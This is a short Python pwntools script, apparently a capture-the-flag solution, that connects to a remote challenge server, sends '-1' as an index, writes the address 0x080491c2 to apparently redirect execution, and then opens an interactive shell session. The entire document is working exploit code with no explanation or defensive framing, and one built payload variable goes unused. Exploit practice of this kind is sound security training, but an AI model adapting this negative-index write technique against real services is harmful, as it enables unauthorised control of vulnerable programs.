from pwn import *

p = remote('challenges.traboda.com', 8014)

payload = p32(0x080491c2)

p.sendlineafter('at: ','-1')

p.sendlineafter('write: ',str(0x080491c2))

p.interactive()
